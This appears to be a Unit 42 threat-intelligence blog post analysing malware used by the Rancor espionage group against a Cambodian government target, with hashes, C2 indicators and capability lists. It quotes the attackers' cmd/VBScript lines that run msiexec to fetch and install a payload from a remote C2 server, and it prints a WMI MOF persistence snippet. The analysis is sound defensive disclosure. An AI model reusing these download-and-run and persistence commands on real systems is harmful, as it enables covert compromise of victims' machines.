{
    "title": "rancor_ cyber espionage group uses new custom malware to attack southeast asia",
    "text": "Tools Playbooks Speaking Events About Us\nRancor: Cyber Espionage Group Uses New\nCustom Malware to Attack Southeast Asia\n19,878 people reacted 7 7 min. read\nThis post is also available in: 日本語  (Japanese )\nExecutive Summary\nIn late June 2018, Unit 42 revealed a previously unknown cyber espionage group we dubbed Rancor , which\nconducted targeted attacks in Southeast Asia throughout 2017 and 2018. In recent attacks, the group has\npersistently targeted at least one government organization in Cambodia from December 2018 through January\n2019. While researching these attacks, we discovered an undocumented, custom malware family – which we’ve\nnamed Dudell. In addition, we discovered the group using Derusbi, which is a malware family believed to be\nunique to a small subset of Chinese cyber espionage groups.\nAttack Details\nBetween early December 2018 and the end of January 2019, Rancor conducted at least two rounds of attacks\nintending to install Derusbi or KHRat malware on victim systems. January 2019 sent via 149.28.156[.]61  to\ndeliver either Derusbi or KHRat samples with either cswksfwq.kfesv[.]xyz  or\nconnect.bafunpda[.]xyz  as C2.\nMalware Overview\nDUDELL\nSHA256 0d61d9baab9927bb484f3e60384fdb6a3709ca74bc6175ab16b220a68f2b349e\nFile Type Microsoft Excel 97 – 2003 Document\nFile Name Equipment Purchase List 2018-2020(Final).xls\nTable 1. DUDELL properties\nThe DUDELL sample is a weaponized Microsoft Excel document that contains a malicious macro that runs on the\nvictim’s machine. It shares the same malicious behavior reported by Checkpoint in Rancor: The Year of The Phish\nSHA-1 c829f5f9ff89210c888c1559bb085ec6e65232de . In Check Point’s blog, the sample is from\nDecember 2018 while this sample is from April 2018. It has the following metadata:\nCodepage 1252\nAuthor MS\nLast author MS\nApplication name Microsoft Excel\nCreation time Mon Oct 14 23:33:28 1996\nLast Save time Wed Apr 11 02:18:59 2018\nSecurity type 0\nTable 2. DUDELL file metadata\nThe macro in this document gets executed when the user views the document and clicks Enable Content , at\nwhich point the macro locates and executes the data located under the Company  field in the document’s\nproperties. The data located under the Company  field is:\ncmd /c set /p=Set v=CreateObject(^”Wscript.Shell^”):v.Run ^”msiexec /q /i\nhttp://199.247.6[.]253/ud^”,false,0 <nul >\nC:\\Windows\\System32\\spool\\drivers\\color\\tmp.vbs\nTable 3. Company field data\nThe C2 server 199.247.6[.]253  listed above in Table 5 is known to be used by the Rancor group. The script is\ndownloading a second stage payload via the Microsoft tool msiexec. Unfortunately at the time of discovery, the\nhosted file is unavailable. Our systems were able to record the hash of file tmp.vbs , but the contents of the file\nare no longer available. See Table 5 below for hash values. Pivoting off the filename and directory, we discovered\na similar VBS script used by the Rancor actors that might give us some clues on what the contents of tmp.vbs\nwould resemble. File office.vbs  (SHA256:\n4b0b319b58c2c0980390e24379a2e2a0a1e1a91d17a9d3e26be6f4a39a7afad2 ) was discovered in\ndirectory c:\\Windows\\System32\\spool\\drivers\\color . The contents of that file are:\nSet v=CreateObject(“Wscript.Shell”):v.Run “msiexec /q /i http://199.247.6[.]253/OFFICE”,false,0\nTable 4. Contents of office.vbs\nSHA256 b958e481c90939962081b9fb85451a2fb28f705d5b5060f5d9d5aebfb390f832\nTable 5. Hashes for tmp.vbs\nIf the file tmp.vbs  does in fact contain similar content as that of office.vbs , then it could be another method\nfor downloading payloads onto the target.\nDDKONG Plugin\nSHA256 0EB1D6541688B5C87F620E76219EC5DB8A6F05732E028A9EC36195D7B4F5E707\nCompile Date and Time 2017-02-17 08:33:45 AM\nFile Type PE32 executable (DLL) Intel 80386, for MS Windows\nFile Name History.nls\nTable 6. DDKONG Plugin properties\nThe malware in question is configured with the following single export entry:\nDllInstall\nThe DllInstall export function is responsible for the core behavior of the malware, as just loading it does nothing.\nOnce this export is called, it checks for a hidden window with a caption of Hello Google!  and a class name of\nGoogle  see Figure 1 below. This check is performed to ensure that only one instance of the malware is running\nat a time.\nFigure 1. DDKONG Plugin hidden window properties\n \nThe hidden window created by the malware filters on any user input (e.g. keyboard or mouse activity). This could\nbe an attempt to evade sandbox analysis as mouse and keyboard movement is typically not performed. The\nmalware then proceeds to beacon to a configured remote server of cswksfwq.kfesv[.]xyz  on TCP port\n8080 . Upon successful connection, the malware transmits victim information such as: hostname, IP address,\nLanguage Pack along with other operating system information. The data transmitted are XOR encoded. The\nmalware supports the following capabilities:\nTerminate specific process\nEnumerate processes\nUpload file\nDownload file\nDelete file\nList folder contents\nEnumerate storage volumes\nExecute a command\nReverse shell\nTake a screenshot\nKHRAT\nSHA256 aaebf987b8d80d71313c3c0f2c16d60874ffecbdda3bb6b44d6cba6d38031609\nCompile Date and Time 2018-05-02 05:22:23 PM\nFile Type PE32 executable (DLL) Intel 80386, for MS Windows\nFile Name 8081.dll\nTable 7. KHRAT properties\nThe malware in question is configured with the following single export entry:\nRmcmd\nWhen the DLL is initially loaded, it dynamically resolves and imports additional modules (DLLs’) needed. Once\nloaded and the export entry of Rmcmd  is called, it creates a Windows mutex named gkdflbmdfk . This ensures\nthat only one copy of the malware is running at a time. It then begins to beacon to a configured domain of\nconnect.bafunpda[.]xyz  on TCP port 8081 . The malware collects and transmits data from the host, such\nas hostname and is XOR encoded with the first byte of the network traffic being the key. This malware supports\nthe following capabilities:\nReverse Shell\nThe malware behavior and code share similarities with an older KHRAT  sample from May 2018. Sample (SHA256:\nbc1c3e754be9f2175b718aba62174a550cdc3d98ab9c36671a58073140381659 ) has the same export\nentry name and is also a reverse shell. The newer sample appears to be a re‐write for optimization purposes with\nthe underlying behavior remaining the same, reverse shell.\nDerusbi\nSHA256 83d1d181a6d583bca2f03c3c4e517757a766da5f4c1299fbbe514b3e2abd9e0d\nCompile Date and Time 2012-09-14 09:20:12 AM\nFile Type PE32 executable (DLL) Intel 80386, for MS Windows\nFile Name 32.dll\nTable 8. Derusbi properties\nDerusbi is a backdoor Trojan believed to be used among a small group of attackers, which includes the Rancor\ngroup. This particular sample is a loader that loads an encrypted payload for its functionality. This DLL requires\nthe loading executable to include a 32‐byte key on the command line to be able to decrypt the embedded\npayload, which unfortunately we do not have. Even though we don’t have the decryption key or loader, we have\nuncovered some interesting artifacts.\nIf the module that loads the sample is named myapp.exe the module will exit\nOnce loaded, it sleeps for six seconds\nLooks for a Windows pipe named \\\\.\\pipe\\_kernel32.dll.ntdll.dll.user32.dll\nLooks for a Windows device named \\Device\\acpi_010221\nCreates the following registry key\nHKEY_CLASSES_ROOT\\CDO.SS_NNTPOnPostEarlySink.2\nTwo DWORD values named IDX and Ver.\nSaves encrypted data at these keys\nThe encryption routine to decrypt the embedded payload is MS_ENH_RSA_AES_PROV\nRancor VBScript\nIn July 2019, we discovered an interesting VBScript named Chrome.vbs  (SHA256:\n0C3D4DFA566F3064A8A408D3E1097C454662860BCACFB6675D2B72739CE449C2 ) associated with the\nRancor group. This particular VBScript payload beacons to domain bafunpda[.]xyz , which is also used by the\nKHRAT Trojan listed above in Table 2. This VBScript is obfuscated and contains packed data that is used to infect\na target with multiple chained persistent artifacts. The following illustrates the behavior when the VBScript is\nexecuted:\nFigure 2. VBScript execution flow\nFigure 1 provides a visual overview of when the VBScript is executed on a host. The script performs the\nfollowing actions:\n1. Copies regsvr32.exe from %windir%\\syswow64  to %windir%\\spoolsw.exe .\n2. Creates a text file named vdfjgklffsdfmv.txt  in the host’s %TMP%  folder. This file is not a text file, but a\nWindows Management Object File MOF.\n3. Executes Windows mofcomp.exe passing in the MOF file created in step 2.\n4. Adds data to two registry keys: classes and media. Data is saved in the default keys.\n5. Reads the blob of data from the registry key classes created in step 4 and saves the data to file\n%windir%\\pla.dat .\nThe MOF file created by the VBScript is used as a persistence mechanism via Windows Management\nInstrumentation (WMI) Event Subscriptions. MOF files are compiled scripts that describe Common Information\nModel (CIM) classes, which are compiled into the WMI repository. The technique is described by MITRE\nATT&CK IDT1084 . This particular MOF file creates a timer event that is triggered every five seconds. Snippet of\nthe MOF file is illustrated in Figure 3 below:\ninstance of CommandLineEventConsumer as $Cons\n{\nName = “SCM Event Log Filter”;\nRunInteractively=false;\nCommandLineTemplate=”c:\\\\windows\\\\spoolsw.exe /s /n /i c:\\\\windows\\\\pla.dat”;\n};\ninstance of __EventFilter as $Filt\n{\nName = “SCM Event Log Filter”;\nEventNamespace = “Root\\\\Cimv2”;\nQuery = “Select * From __InstanceModificationEvent “\n“Where TargetInstance Isa \\”Win32_LocalTime\\” “\n“And TargetInstance.Second = 5”;\nQueryLanguage = “WQL”;\n};\nFigure 3. Snippet of MOF file\nFigure 3 shows the main functionality of the MOF file. It has a unique name of  SCM Event Log Filter  and\nruns spoolsw.exe every 5 seconds, with the /s /n /i parameters passing in file pla.dat. If we recall earlier from the\nVBScript, spoolsw.exe is the hosts Windows regsvr32.exe. Regsvr32.exe is a Windows tool that registers a\nmodule (DLL). The parameters passed instruct regsvr32 not to display any message boxes (/s), do not call\nDllRegisterServer or DllUnregisterServer (/n) and calls DllInstall (/i). File pla.dat therefore must be a DLL.\nThe registry values created by the VBScript are as follows:\n1. HKEY_CURRENT_USER\\Software\\Classes\nContains x86 code for a DLL. It is missing the first byte of 0x4 which is added by the VBScript when file\npla.dat  is created.\nFile Properties for embedded registry data at HKEY_CURRENT_USER\\Software\\Classes\nSHA256 DB982B256843D8B6429AF24F766636BB0BF781B471922902D8DCF08D0C58511E\nCompile Date and Time 2018-04-24 10:51:14 PM\nFile Type PE32 executable (DLL) Intel 80386, for MS Windows\nExport Table DllInstall\nTable 9. Reg Classes embedded data properties\nThe DLL embedded in this registry key is a simple loader that loads the code from the registry\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Clients\\Media\n1. HKEY_LOCAL_MACHINE\\SOFTWARE\\Clients\\Media\nContains shellcode and x86 code for a DLL. Data saved in registry is encoded with a XOR key of 0x9C.\nSHA256 CC081FFEA6F4769733AF9D0BAE0308CA0AE63667FA225E7965DF0884E96E2D2A\nCompile Date and Time 2018-01-10 09:16:42 PM\nFile Type PE32 executable (DLL) Intel 80386, for MS Windows\nTable 10. Decoded media DLL data properties\nThe DLL located in the Media registry key is a variant of the KHRAT Trojan . It beacons to domain\nconnect.bafunpda[.]xyz  and attempts to connect to TCP port 4433 . This is the same domain used by the\nKHRAT Trojan listed above in Table 2 and shares the same behavior.\nConclusion\nRancor, a cyber espionage group active since at least 2017, continues to conduct targeted attacks in Southeast\nAsia and has been found using an undocumented, custom malware family – which we’ve dubbed Dudell – to\ndownload a second stage payload once its malicious macro is executed. Additionally, Rancor is also using the\nDerusbi malware family to load a secondary payload once it infiltrates a target.\nPalo Alto Networks customers are protected from this threat. Our threat prevention  platform detects these\nmalware families, with Wildfire  while and simultaneously updating the ‘ malware’  category within the PAN‐DB URL\nfiltering solution  for compromised domains it has identified. AutoFocus customers can further investigate this\nactivity with the following tags:\nRancor\nPLAINTEE\nDUDELL\nDerusbi\nIndicators of Compromise\nSHA256:\n0EB1D6541688B5C87F620E76219EC5DB8A6F05732E028A9EC36195D7B4F5E707\nAAEBF987B8D80D71313C3C0F2C16D60874FFECBDDA3BB6B44D6CBA6D38031609\n0D61D9BAAB9927BB484F3E60384FDB6A3709CA74BC6175AB16B220A68F2B349E\nDB982B256843D8B6429AF24F766636BB0BF781B471922902D8DCF08D0C58511E\nCC081FFEA6F4769733AF9D0BAE0308CA0AE63667FA225E7965DF0884E96E2D2A\nBC1C3E754BE9F2175B718ABA62174A550CDC3D98AB9C36671A58073140381659\n83d1d181a6d583bca2f03c3c4e517757a766da5f4c1299fbbe514b3e2abd9e0d\nC2s\ncswksfwq.kfesv[.]xyz\nConnect.bafunpda[.]xyz\n199.247.6[.]253\n \nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from usBy Jen Miller‐Osborn  and Mike Harbison\nDecember 17, 2019 at 5:30 AM\nCategory: Unit 42\nTags: Asia, China , cyber espionage , Derusbi , Dudell , malware , RANCOR , RAT, Remote Access Trojan\nEmail address Subscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.Popular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemapLegal No ces\nPrivacy\nTerms of Use\nDocumentsAccount\nManage Subscriptions\nReport a Vulnerability\nSearch Unit 42\nSHARE \n "
}